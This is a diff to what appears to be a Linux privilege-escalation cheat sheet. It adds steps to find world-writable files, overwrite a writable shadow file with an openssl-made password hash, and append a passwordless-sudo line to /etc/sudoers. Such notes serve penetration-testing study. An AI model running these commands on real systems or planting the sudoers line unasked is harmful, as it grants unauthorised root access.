@@ -926,12 +926,22 @@ find / -perm -u=s -type f 2>/dev/null
 grep -rnw / -e "root"
 ```
 
-Tinkering with `/etc/sudoers` file.
+Find files with open write permissions:
 ```
-sudo -l
-cat /etc/sudoers
+find / -type f -perm -0002
+```
+
+If `/etc/shadows` is writable, then you can change password. Generate password using `openssl` and replace it on the file.
+```
+openssl passwd -1 'New_passw0rd'
+```
+
+Basically, the `sudo -l` command runs as per configured on the `/etc/sudoers` file. If that file is writable, then tinker with `/etc/sudoers` file.
+```
 echo "username ALL=NOPASSWD:ALL" >> /etc/sudoers
 ```
+
+
 
 **Linux Exploit Suggester** [here](https://github.com/The-Z-Labs/linux-exploit-suggester)
 ```
